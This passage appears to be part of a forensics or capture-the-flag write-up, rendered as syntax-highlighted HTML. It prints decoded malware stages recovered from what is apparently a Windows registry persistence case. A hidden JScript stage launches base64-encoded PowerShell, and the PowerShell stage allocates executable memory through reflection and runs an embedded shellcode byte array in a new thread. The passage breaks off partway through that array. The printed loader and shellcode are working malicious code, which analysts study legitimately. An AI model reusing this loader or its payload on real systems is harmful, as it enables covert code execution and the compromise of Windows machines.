class="w">  </span><span class="nx">zBrSmpYsigYQbtw8fZqzdrel</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"TXvxkwiywWNQtWoZc3fJq2xil7k9Jdkpgo266WuVst"</span><span class="p">;</span><span class="w">  </span><span class="nx">krqHBDMxarB2eoHmxkhm</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"RQxQJFR7RBxKmbh68"</span><span class="p">;</span><span class="w">  </span><span class="nx">WVqaBpTVpt1M9ofdAOPggqR</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"IcYyfpiGXQCm79GAnep3F2"</span><span class="p">;</span>

<span class="err">\</span><span class="nx">Software</span><span class="err">\</span><span class="nx">lirs</span><span class="o">&gt;</span><span class="w"> </span>
<span class="nx">Hives</span><span class="w"> </span><span class="nx">that</span><span class="w"> </span><span class="nx">have</span><span class="w"> </span><span class="nx">changed</span><span class="o">:</span>
<span class="w"> </span><span class="err">#</span><span class="w">  </span><span class="nx">Name</span>
<span class="nx">None</span><span class="o">!</span>
</code></pre></div>
</li>
<li>
<p>Generated decoded JS: /tmp/recovered_flag/orhmkbye_stage.js</p>
<div class="highlight"><pre><span></span><code><span class="nx">ZCqozRWlLAUUQZqj9efjtW</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"WzXSwWOu2RzdVlcQpB9eSehda2rO3hRfBmX1yCbxLqfz"</span><span class="p">;</span>
<span class="nx">emEVUyGAUKApWupbIR2ANB4</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"KrohGvZll2YAxyE69sWT6MF"</span><span class="p">;</span>
<span class="nx">mGE1DmVHzmz9UoxXyunNWbcd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"BG0AVYU3u62sd8I1ZjK4Fdz"</span><span class="p">;</span>
<span class="nx">Qv4zvBaMFHwqddEqDOHDw</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"CpJ25SMu6Yc4NSptN2sTheJ6uQDidj45KgxJb85"</span><span class="p">;</span>
<span class="nx">PJDvFrcJNuwctCMo3MpfTM</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"a7btBsPWj12VCIkPL"</span><span class="p">;</span>
<span class="nx">meK4f6kIBNvDjKUbABlM</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"4joGmoFzSzkARtpHP1OZUVIMWtwq8bGji"</span><span class="p">;</span>
<span class="nx">VpFxZdq2tbBGNPJJiO</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"p1dx8sE7weSy5OjbVcEcpYC0YB6RS"</span><span class="p">;</span>
<span class="k">try</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">moveTo</span><span class="p">(</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mf">100</span><span class="p">,</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mf">100</span><span class="p">);</span>
<span class="w">    </span><span class="nx">resizeTo</span><span class="p">(</span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="mf">0</span><span class="p">);</span>
<span class="w">    </span><span class="nx">z9E</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">ActiveXObject</span><span class="p">(</span><span class="s2">"WScript.Shell"</span><span class="p">);</span>
<span class="w">    </span><span class="p">(</span><span class="nx">z9E</span><span class="p">.</span><span class="nx">Environment</span><span class="p">(</span><span class="s2">"Process"</span><span class="p">))(</span><span class="s2">"legtuq"</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"iex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String('I2dncmZzYmxwYnBzDQpzbGVlcCgxNSk7DQp0cnkgew0KICAgIA0KI2VsYmNpbA0KICAgIGZ1bmN0aW9uIGdkZWxlZ2F0ZSB7DQogICAgICAgIA0KI2RkemwNCiAgICAgICAgUGFyYW0gKFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBNYW5kYXRvcnkgPSAkVHJ1ZSldIFtUeXBlW11dICRQYXJhbWV0ZXJzLCBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMSldIFtUeXBlXSAkUmV0dXJuVHlwZSA9IFtWb2lkXSk7DQogICAgICAgIA0KI25ucmV0DQogICAgICAgICRUeXBlQnVpbGRlciA9IFtBcHBEb21haW5dOjpDdXJyZW50RG9tYWluLkRlZmluZUR5bmFtaWNBc3NlbWJseSgoTmV3IC0gT2JqZWN0IFN5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5TmFtZSgiUmVmbGVjdGVkRGVsZWdhdGUiKSksIFtTeXN0ZW0uUmVmbGVjdGlvbi5FbWl0LkFzc2VtYmx5QnVpbGRlckFjY2Vzc106OlJ1bikuRGVmaW5lRHluYW1pY01vZHVsZSgiSW5NZW1vcnlNb2R1bGUiLCAkZmFsc2UpLkRlZmluZVR5cGUoIlhYWCIsICJDbGFzcyxQdWJsaWMsU2VhbGVkLEFuc2lDbGFzcyxBdXRvQ2xhc3MiLCBbU3lzdGVtLk11bHRpY2FzdERlbGVnYXRlXSk7DQogICAgICAgIA0KI2xxeWZrDQogICAgICAgICRUeXBlQnVpbGRlci5EZWZpbmVDb25zdHJ1Y3RvcigiUlRTcGVjaWFsTmFtZSxIaWRlQnlTaWcsUHVibGljIiwgW1N5c3RlbS5SZWZsZWN0aW9uLkNhbGxpbmdDb252ZW50aW9uc106OlN0YW5kYXJkLCAkUGFyYW1ldGVycykuU2V0SW1wbGVtZW50YXRpb25GbGFncygiUnVudGltZSxNYW5hZ2VkIik7DQogICAgICAgIA0KI2xyZGl4aA0KICAgICAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lTWV0aG9kKCJJbnZva2UiLCAiUHVibGljLEhpZGVCeVNpZyxOZXdTbG90LFZpcnR1YWwiLCAkUmV0dXJuVHlwZSwgJFBhcmFtZXRlcnMpLlNldEltcGxlbWVudGF0aW9uRmxhZ3MoIlJ1bnRpbWUsTWFuYWdlZCIpOw0KICAgICAgICANCiNvb3BkDQogICAgICAgIHJldHVybiAkVHlwZUJ1aWxkZXIuQ3JlYXRlVHlwZSgpOw0KICAgIH0NCg0KICAgIA0KI3Bycmt0a3INCiAgICBmdW5jdGlvbiBncHJvYyB7DQogICAgICAgIA0KI2dtaHduc2sNCiAgICAgICAgUGFyYW0gKFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBNYW5kYXRvcnkgPSAkVHJ1ZSldIFtTdHJpbmddICRNb2R1bGUsIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAxLCBNYW5kYXRvcnkgPSAkVHJ1ZSldIFtTdHJpbmddICRQcm9jZWR1cmUpOw0KICAgICAgICANCiN5a3J1cQ0KICAgICAgICAkU3lzdGVtQXNzZW1ibHkgPSBbQXBwRG9tYWluXTo6Q3VycmVudERvbWFpbi5HZXRBc3NlbWJsaWVzKCl8V2hlcmUgLSBPYmplY3Qgew0KICAgICAgICAgICAgJF8uR2xvYmFsQXNzZW1ibHlDYWNoZSAgLSBBbmQgJF8uTG9jYXRpb24uU3BsaXQoIlwiKVstMV0uRXF1YWxzKCJTeXN0ZW0uZGxsIil9Ow0KI2t1ZWdqDQokVW5zYWZlTmF0aXZlTWV0aG9kcz0kU3lzdGVtQXNzZW1ibHkuR2V0VHlwZSgiTWljcm9zb2Z0LldpbjMyLlVuc2FmZU5hdGl2ZU1ldGhvZHMiKTsNCiNreGp5bncNCnJldHVybiAkVW5zYWZlTmF0aXZlTWV0aG9kcy5HZXRNZXRob2QoIkdldFByb2NBZGRyZXNzIikuSW52b2tlKCRudWxsLEAoW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5IYW5kbGVSZWZdKE5ldy1PYmplY3QgU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLkhhbmRsZVJlZigoTmV3LU9iamVjdCBJbnRQdHIpLCRVbnNhZmVOYXRpdmVNZXRob2RzLkdldE1ldGhvZCgiR2V0TW9kdWxlSGFuZGxlIikuSW52b2tlKCRudWxsLCBAKCRNb2R1bGUpKSkpLCAkUHJvY2VkdXJlKSk7DQogICAgICAgIH0NCg0KICAgICAgICANCiN1eGJ1a2ZqcHZ4DQogICAgICAgIFtCeXRlW11dICRzYzMyID0gMHhkYSwgMHhjMSwgMHhiYSwgMHhlNiwgMHg2NCwgMHhmYSwgMHg3MiwgMHhkOSwgMHg3NCwgMHgyNCwgMHhmNCwgMHg1OCwgMHgyYiwgMHhjOSwgMHhiMSwgMHg1OCwgMHgzMSwgMHg1MCwgMHgxNywgMHg4MywgMHhlOCwgMHhmYywgMHgwMywgMHhiNiwgMHg3NywgMHgxOCwgMHg4NywgMHhjYSwgMHgzMCwgMHg1ZiwgMHg4YywgMHhjMiwgMHgyOSwgMHg5ZiwgMHg0ZCwgMHgyMiwgMHhhYSwgMHg2MSwgMHgxZiwgMHg2MywgMHhmYSwgMHgzMywgMHhjZSwgMHgzNSwgMHhiMiwgMHg4MiwgMHgyMiwgMHhkYywgMHgwYSwgMHg2ZSwgMHg5MCwgMHg3ZSwgMHhjMywgMHhmYiwgMHg0NywgMHg2NiwgMHg5YiwgMHg3MCwgMHgzNSwgMHhiNiwgMHg1MywgMHgwYywgMHhjOCwgMHhlNiwgMHgyYiwgMHgxZCwgMHg5YSwgMHg0YywgMHhlNiwgMHg2YywgMHhkNSwgMHg5OSwgMHhiZSwgMHg1ZiwgMHhkNSwgMHhiNSwgMHgwMywgMHhjMSwgMHhhOSwgMHhjNywgMHg1NywgMHgyMSwgMHgxMywgMHgwNiwgMHg2ZSwgMHgyYywgMHhkMiwgMHg4OSwgMHhiMCwgMHhjZCwgMHgzOSwgMHhkYiwgMHg3MywgMHg0MywgMHg4YSwgMHg1MCwgMHgyMSwgMHg0MywgMHg4MSwgMHgyNCwgMHhmYSwgMHhjYiwgMHg5NCwgMHg3OCwgMHg4OSwgMHg0YywgMHgxZSwgMHg3OCwgMHg4ZSwgMHg0YywgMHg1NywgMHhmZCwgMHg0ZSwgMHgzOCwgMHgwMCwgMHhiNSwgMHg0ZiwgMHgxMSwgMHg5ZSwgMHhjZSwgMHgxOCwgMHg4OSwgMHg1YiwgMHg1YiwgMHhkOCwgMHg4OSwgMHgyYSwgMHg1YSwgMHgwOSwgMHgyYSwgMHhmYSwgMHgxNCwgMHg1NiwgMHg2NCwgMHg0MiwgMHgyZiwgMHg5YywgMHhmZiwgMHgwZCwgMHgyZSwgMHgwYiwgMHhiMiwgMHhiYywgMHhmOSwgMHhmYiwgMHg3YywgMHg3ZiwgMHg1NSwgMHhiYSwgMHhiZiwgMHhiNiwgMHhhOCwgMHg3YywgMHg0MSwgMHg4OCwgMHg4YSwgMHg5ZSwgMHgzNCwgMHhmYiwgMHhhNiwgMHg1ZCwgMHhmYiwgMHhkZiwgMHgzZSwgMHgyNywgMHgzYSwgMHhmMSwgMHg0YiwgMHg3ZiwgMHg2NCwgMHhiNSwgMHgzOCwgMHgzZiwgMHhiMSwgMHg3YywgMHgzZiwgMHgxMCwgMHhkZiwgMHgzZiwgMHhiNCwgMHg5YywgMHg2OCwgMHg4NCwgMHg0MSwgMHhkYywgMHg3NCwgMHg0ZCwgMHg1NCwgMHgwZCwgMHhjNSwgMHhjNiwgMHg1MiwgMHgyNSwgMHg4ZSwgMHhkOSwgMHg4YSwgMHg3NCwgMHg1NywgMHg5YiwgMHg3MiwgMHgyOSwgMHgzZSwgMHg0MSwgMHhjMywgMHg4ZCwgMHg4MSwgMHgyYywgMHg4MiwgMHg3NywgMHg0YSwgMHg0YywgMHhlOCwgMHhhOCwgMHgwYiwgMHgwMCwgMHgwZiwgMHg0OCwgMHhkMywgMHhlNSwgMHhiNiwgMHhkMywgMHhhYywgMHg2ZSwgMHg1YSwgMHgwZCwgMHg3YiwgMHg4ZSwgMHhhNSwgMHgzMiwgMHhkOSwgMHgzOCwgMHhlMywgMHhjYywgMHhlMiwgMHhiOCwgMHgxMywgMHhjZiwgMHhlMiwgMHhiOCwgMHgxMywgMHg4NywgMHg2ZiwgMHgzNSwgMHgxMiwgMHgxNiwgMHg3MCwgMHg0NiwgMHg1NSwgMHhhMiwgMHg0MSwgMHhjZCwgMHgzYSwgMHg1NSwgMHg1ZSwgMHgwNCwgMHg3ZiwgMHhhOSwgMHgxNCwgMHgwNSwgMHgyOSwgMHgwYiwgMHhlZCwgMHhlYywgMHg0MCwgMHgzNiwgMHg4YywgMHgwZSwgMHhiZiwgMHgwMSwgMHgyYywgMHgzNCwgMHgxNywgMHhhZSwgMHgzNCwgMHhjOSwgMHg2ZCwgMHg0ZSwgMHhjMywgMHhkMSwgMHgwNCwgMHg0YiwgMHg4ZiwgMHg1NSwgMHhmNSwgMHgyMSwgMHg4MCwgMHgzMywgMHhmOSwgMHg5YywgMHgxZiwgMHg0ZCwgMHgyMywgMHhlMSwgMHg3NSwgMHgyZSwgMHhiZSwgMHg3YSwgMHg1NiwgMHg5ZSwgMHgyMywgMHhhMywgMHhiMSwgMHg4NSwgMHhjMCwgMHhjYiwgMHhkMiwgMHg2NSwgMHg1MCwgMHg2NywgMHg2NCwgMHgyMywgMHgwNiwgMHgwNCwgMHgyZiwgMHhmYywgMHhkNSwgMHhkYywgMHg4NiwgMHg0NCwgMHg3NSwgMHg1YiwgMHg3ZiwgMHgyNywgMHhlZCwgMHhkYywgMHgyNSwgMHhmNCwgMHhiNCwgMHg5MiwgMHg5MywgMHg4MywgMHgyMSwgMHgzZSwgMHg2ZSwgMHgwZCwgMHhjYSwgMHhiMSwgMHgyNSwgMHg4NCwgMHgyNCwgMHg0NywgMHhmMCwgMHg2NSwgMHgzNywgMHhjOCwgMHg2MSwgMHhkOSwgMHhjNCwgMHg2MiwgMHgwZiwgMHhlZSwgMHgxYSwgMHhmYSwgMHg4NCwgMHg2OSwgMHgzZSwgMHhjNSwgMHg1NiwgMHhmMywgMHg4ZSwgMHg0NywgMHgyYywgMHg2ZCwgMHg4MSwgMHhkNywgMHhmZSwgMHgyMiwgMHgzNiwgMHg2YiwgMHhhNiwgMHhhMywgMHhmNSwgMHhiNiwgMHg3ZiwgMHgyYzsNCiAgICAgICAgDQojcXp4dGgNCiAgICAgICAgJHByID0gKFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKChncHJvYyBrZXJuZWwzMi5kbGwgVmlydHVhbEFsbG9jKSwgKGdkZWxlZ2F0ZSBAKFtJbnRQdHJdLCBbVUludDMyXSwgW1VJbnQzMl0sIFtVSW50MzJdKSAoW1VJbnQzMl0pKSkpLkludm9rZSgwLCAkc2MzMi5MZW5ndGgsIDB4MzAwMCwgMHg0MCk7DQogICAgICAgIA0KI3RqbXRocWMNCiAgICAgICAgaWYgKCRwciAgLSBuZSAwKSAgew0KICAgICAgICAgICAgJG1lbXNldCA9IChbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigoZ3Byb2MgbXN2Y3J0LmRsbCBtZW1zZXQpLCAoZ2RlbGVnYXRlIEAoW1VJbnQzMl0sIFtVSW50MzJdLCBbVUludDMyXSkgKFtJbnRQdHJdKSkpKTsNCiAgICAgICAgICAgIA0KI29scGF2cmFicXoNCiAgICAgICAgICAgIGZvciAoJGkgPSAwOw0KICAgICAgICAgICAgJGkgIC0gbGUgKCRzYzMyLkxlbmd0aCAtIDEpOw0KICAgICAgICAgICAgJGkrKykgew0KICAgICAgICAgICAgICAgICRtZW1zZXQuSW52b2tlKCgkcHIgKyAkaSksICRzYzMyWyRpXSwgMSkNCiAgICAgICAgICAgIH07DQogICAgICAgICAgICANCiNrcnl0DQogICAgICAgICAgICAoW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoKGdwcm9jIGtlcm5lbDMyLmRsbCBDcmVhdGVUaHJlYWQpLCAoZ2RlbGVnYXRlIEAoW0ludFB0cl0sIFtVSW50MzJdLCBbVUludDMyXSwgW1VJbnQzMl0sIFtVSW50MzJdLCBbSW50UHRyXSkgKFtJbnRQdHJdKSkpKS5JbnZva2UoMCwgMCwgJHByLCAkcHIsIDAsIDApOw0KICAgICAgICAgICAgDQojc3F6dXp5DQogICAgICAgIH0NCg0KICAgICAgICBzbGVlcCgxMjAwKTsNCiAgICB9IGNhdGNoIHt9DQoNCiAgICBleGl0Ow0KICAgIA0KI2FrZHVhaA0KI3BpcnZuZXpucXZ2Y2Z5cWxiZHRmaGg=')))"</span><span class="p">;</span>
<span class="w">    </span><span class="nx">B4Rcr8</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">z9E</span><span class="p">.</span><span class="nx">Run</span><span class="p">(</span><span class="s2">"C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe iex $env:legtuq"</span><span class="p">,</span><span class="w"> </span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="mf">1</span><span class="p">);</span>
<span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span><span class="w"> </span><span class="p">{}</span>

<span class="nx">close</span><span class="p">();</span>
</code></pre></div>
</li>
<li>
<p>Generated decoded PS: /tmp/recovered_flag/orhmkbye_stage.ps1</p>
<div class="highlight"><pre><span></span><code><span class="n">#ggrfsblpbps</span>
<span class="nx">sleep</span><span class="p">(</span><span class="mf">15</span><span class="p">);</span>
<span class="k">try</span><span class="w"> </span><span class="p">{</span>

<span class="n">#elbcil</span>
<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">gdelegate</span><span class="w"> </span><span class="p">{</span>

<span class="n">#ddzl</span>
<span class="w">        </span><span class="nx">Param</span><span class="w"> </span><span class="p">([</span><span class="nx">Parameter</span><span class="p">(</span><span class="nx">Position</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="nx">Mandatory</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">$True</span><span class="p">)]</span><span class="w"> </span><span class="p">[</span><span class="nx">Type</span><span class="p">[]]</span><span class="w"> </span><span class="nx">$Parameters</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="nx">Parameter</span><span class="p">(</span><span class="nx">Position</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">1</span><span class="p">)]</span><span class="w"> </span><span class="p">[</span><span class="nx">Type</span><span class="p">]</span><span class="w"> </span><span class="nx">$ReturnType</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="nx">Void</span><span class="p">]);</span>

<span class="n">#nnret</span>
<span class="w">        </span><span class="nx">$TypeBuilder</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="nx">AppDomain</span><span class="p">]</span><span class="o">::</span><span class="nx">CurrentDomain</span><span class="p">.</span><span class="nx">DefineDynamicAssembly</span><span class="p">((</span><span class="nx">New</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nb">Object</span><span class="w"> </span><span class="nx">System</span><span class="p">.</span><span class="nx">Reflection</span><span class="p">.</span><span class="nx">AssemblyName</span><span class="p">(</span><span class="s2">"ReflectedDelegate"</span><span class="p">)),</span><span class="w"> </span><span class="p">[</span><span class="nx">System</span><span class="p">.</span><span class="nx">Reflection</span><span class="p">.</span><span class="nx">Emit</span><span class="p">.</span><span class="nx">AssemblyBuilderAccess</span><span class="p">]</span><span class="o">::</span><span class="nx">Run</span><span class="p">).</span><span class="nx">DefineDynamicModule</span><span class="p">(</span><span class="s2">"InMemoryModule"</span><span class="p">,</span><span class="w"> </span><span class="nx">$false</span><span class="p">).</span><span class="nx">DefineType</span><span class="p">(</span><span class="s2">"XXX"</span><span class="p">,</span><span class="w"> </span><span class="s2">"Class,Public,Sealed,AnsiClass,AutoClass"</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="nx">System</span><span class="p">.</span><span class="nx">MulticastDelegate</span><span class="p">]);</span>

<span class="n">#lqyfk</span>
<span class="w">        </span><span class="nx">$TypeBuilder</span><span class="p">.</span><span class="nx">DefineConstructor</span><span class="p">(</span><span class="s2">"RTSpecialName,HideBySig,Public"</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="nx">System</span><span class="p">.</span><span class="nx">Reflection</span><span class="p">.</span><span class="nx">CallingConventions</span><span class="p">]</span><span class="o">::</span><span class="nx">Standard</span><span class="p">,</span><span class="w"> </span><span class="nx">$Parameters</span><span class="p">).</span><span class="nx">SetImplementationFlags</span><span class="p">(</span><span class="s2">"Runtime,Managed"</span><span class="p">);</span>

<span class="n">#lrdixh</span>
<span class="w">        </span><span class="nx">$TypeBuilder</span><span class="p">.</span><span class="nx">DefineMethod</span><span class="p">(</span><span class="s2">"Invoke"</span><span class="p">,</span><span class="w"> </span><span class="s2">"Public,HideBySig,NewSlot,Virtual"</span><span class="p">,</span><span class="w"> </span><span class="nx">$ReturnType</span><span class="p">,</span><span class="w"> </span><span class="nx">$Parameters</span><span class="p">).</span><span class="nx">SetImplementationFlags</span><span class="p">(</span><span class="s2">"Runtime,Managed"</span><span class="p">);</span>

<span class="n">#oopd</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">$TypeBuilder</span><span class="p">.</span><span class="nx">CreateType</span><span class="p">();</span>
<span class="w">    </span><span class="p">}</span>


<span class="n">#prrktkr</span>
<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">gproc</span><span class="w"> </span><span class="p">{</span>

<span class="n">#gmhwnsk</span>
<span class="w">        </span><span class="nx">Param</span><span class="w"> </span><span class="p">([</span><span class="nx">Parameter</span><span class="p">(</span><span class="nx">Position</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="nx">Mandatory</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">$True</span><span class="p">)]</span><span class="w"> </span><span class="p">[</span><span class="nb">String</span><span class="p">]</span><span class="w"> </span><span class="nx">$Module</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="nx">Parameter</span><span class="p">(</span><span class="nx">Position</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">1</span><span class="p">,</span><span class="w"> </span><span class="nx">Mandatory</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">$True</span><span class="p">)]</span><span class="w"> </span><span class="p">[</span><span class="nb">String</span><span class="p">]</span><span class="w"> </span><span class="nx">$Procedure</span><span class="p">);</span>

<span class="n">#ykruq</span>
<span class="w">        </span><span class="nx">$SystemAssembly</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="nx">AppDomain</span><span class="p">]</span><span class="o">::</span><span class="nx">CurrentDomain</span><span class="p">.</span><span class="nx">GetAssemblies</span><span class="p">()</span><span class="o">|</span><span class="nx">Where</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nb">Object</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">$_</span><span class="p">.</span><span class="nx">GlobalAssemblyCache</span><span class="w">  </span><span class="o">-</span><span class="w"> </span><span class="nx">And</span><span class="w"> </span><span class="nx">$_</span><span class="p">.</span><span class="nx">Location</span><span class="p">.</span><span class="nx">Split</span><span class="p">(</span><span class="s2">"\")[-1].Equals("</span><span class="nx">System</span><span class="p">.</span><span class="nx">dll</span><span class="s2">")};</span>
<span class="s2">#kuegj</span>
<span class="s2">$UnsafeNativeMethods=$SystemAssembly.GetType("</span><span class="nx">Microsoft</span><span class="p">.</span><span class="nx">Win32</span><span class="p">.</span><span class="nx">UnsafeNativeMethods</span><span class="s2">");</span>
<span class="s2">#kxjynw</span>
<span class="s2">return $UnsafeNativeMethods.GetMethod("</span><span class="nx">GetProcAddress</span><span class="s2">").Invoke($null,@([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr),$UnsafeNativeMethods.GetMethod("</span><span class="nx">GetModuleHandle</span><span class="err">"</span><span class="p">).</span><span class="nx">Invoke</span><span class="p">(</span><span class="nx">$null</span><span class="p">,</span><span class="w"> </span><span class="err">@</span><span class="p">(</span><span class="nx">$Module</span><span class="p">)))),</span><span class="w"> </span><span class="nx">$Procedure</span><span class="p">));</span>
<span class="w">        </span><span class="p">}</span>


<span class="n">#uxbukfjpvx</span>
<span class="w">        </span><span class="p">[</span><span class="nx">Byte</span><span class="p">[]]</span><span class="w"> </span><span class="nx">$sc32</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0xda</span><span class="p">,</span><span class="w"> </span><span class="mh">0xc1</span><span class="p">,</span><span class="w"> </span><span class="mh">0xba</span><span class="p">,</span><span class="w"> </span><span class="mh">0xe6</span><span class="p">,</span><span class="w"> </span><span class="mh">0x64</span><span class="p">,</span><span class="w"> </span><span class="mh">0xfa</span><span class="p">,</span><span class="w"> </span><span class="mh">0x72</span><span class="p">,</span><span class="w"> </span><span class="mh">0xd9</span><span class="p">,</span><span class="w"> </span><span class="mh">0x74</span><span class="p">,</span><span class="w"> </span><span class="mh">0x24</span><span class="p">,</span><span class="w"> </span><span class="mh">0xf4</span><span class="p">,</span><span class="w"> </span><span class="mh">0x58</span><span class="p">,</span><span class="w"> </span><span class="mh">0x2b</span><span class="p">,</span><span class="w"> </span><span class="mh">0xc9</span><span class="p">,</span><span class="w"> </span><span class="mh">0xb1</span><span class="p">,</span><span class="w"> </span><span class="mh">0x58</span><span class="p">,</span><span class="w"> </span><span class="mh">0x31</span><span class="p">,</span><span class="w"> </span><span class="mh">0x50</span><span class="p">,</span><span class="w"> </span><span class="mh">0x17</span><span class="p">,</span><span class="w"> </span><span class="mh">0x83</span><span class="p">,</span><span class="w"> </span><span class="mh">0xe8</span><span class="p">,</span><span class="w"> </span><span class="mh">0xfc</span><span class="p">,</span><span class="w"> </span><span class="mh">0x03</span><span class="p">,</span><span class="w"> </span><span class="mh">0xb6</span><span class="p">,</span><span class="w"> </span><span class="mh">0x77</span><span class="p">,</span><span class="w"> </span><span class="mh">0x18</span><span class="p">,</span><span class="w"> </span><span class="mh">0x87</span><span class="p">,</span><span class="w"> </span><span class="mh">0xca</span><span class="p">,</span><span class="w"> </span><span class="mh">0x30</span><span class="p">,</span><span class="w"> </span><span class="mh">0x5f</span><span class="p">,</span><span class="w"> </span><span class="mh">0x8c</span><span class="p">,</span><span class="w"> </span><span class="mh">0xc2</span><span class="p">,</span><span class="w"> </span><span class="mh">0x29</span><span class="p">,</span><span class="w"> </span><span class="mh">0x9f</span><span class="p">,</span><span class="w"> </span><span class="mh">0x4d</span><span class="p">,</span><span class="w"> </span><span class="mh">0x22</span><span class="p">,</span><span class="w"> </span><span class="mh">0xaa</span><span class="p">,</span><span class="w"> </span><span class="mh">0x61</span><span class="p">,</span><span class="w"> </span><span class="mh">0x1f</span><span class="p">,</span><span class="w"> </span><span class="mh">0x63</span><span class="p">,</span><span class="w"> </span><span class="mh">0xfa</span><span class="p">,</span><span class="w"> </span><span class="mh">0x33</span><span class="p">,</span><span class="w"> </span><span class="mh">0xce</span><span class="p">,</span><span class="w"> </span><span class="mh">0x35</span><span class="p">,</span><span class="w"> </span><span class="mh">0xb2</span><span class="p">,</span><span class="w"> </span><span class="mh">0x82</span><span class="p">,</span><span class="w"> </span><span class="mh">0x22</span><span class="p">,</span><span class="w"> </span><span class="mh">0xdc</span><span class="p">,</span><span class="w"> </span><span class="mh">0x0a</span><span class="p">,</span><span class="w"> </span><span class="mh">0x6e</span><span class="p">,</span><span class="w"> </span><span class="mh">0x90</span><span class="p">,</span><span class="w"> </span><span class="mh">0x7e</span><span class="p">,</span><span class="w"> </span><span class="mh">0xc3</span><span class="p">,</span><span class="w"> </span><span class="mh">0xfb</span><span class="p">,</span><span class="w"> </span><span class="mh">0x47</span><span class="p">,</span><span class="w"> </span><span class="mh">0x66</span><span class="p">,</span><span class="w"> </span><span class="mh">0x9b</span><span class="p">,</span><span class="w"> </span><span class="mh">0x70</span><span class="p">,</span><span class="w"> </span><span class="mh">0x35</span><span class="p">,</span><span class="w"> </span><span class="mh">0xb6</span><span class="p">,</span><span class="w"> </span><span class="mh">0x53</span><span class="p">,</span><span class="w"> </span><span class="mh">0x0c</span><span class="p">,</span><span class="w"> </span><span class="mh">0xc8</span><span class="p">,</span><span class="w"> </span><span class="mh">0xe6</span><span class="p">,</span><span class="w"> </span><span class="mh">0x2b</span><span class="p">,</span><span class="w"> </span><span class="mh">0x1d</span><span class="p">,</span><span class="w"> </span><span class="mh">0x9a</span><span class="p">,</span><span class="w"> </span><span class="mh">0x4c</span><span class="p">,</span><span class="w"> </span><span class="mh">0xe6</span><span class="p">,</span><span class="w"> </span><span class="mh">0x6c</span><span class="p">,</span><span class="w"> </span><span class="mh">0xd5</span><span class="p">,</span><span class="w"> </span><span class="mh">0x99</span><span class="p">,</span><span class="w"> </span><span class="mh">0xbe</span><span class="p">,</span><span class="w"> </span><span class="mh">0x5f</span><span class="p">,</span><span class="w"> </span><span class="mh">0xd5</span><span class="p">,</span><span class="w"> </span><span class="mh">0xb5</span><span class="p">,</span><span class="w"> </span><span class="mh">0x03</span><span class="p">,</span><span class="w"> </span><span class="mh">0xc1</span><span class="p">,</span><span class="w"> </span><span class="mh">0xa9</span><span class="p">,</span><span class="w"> </span><span 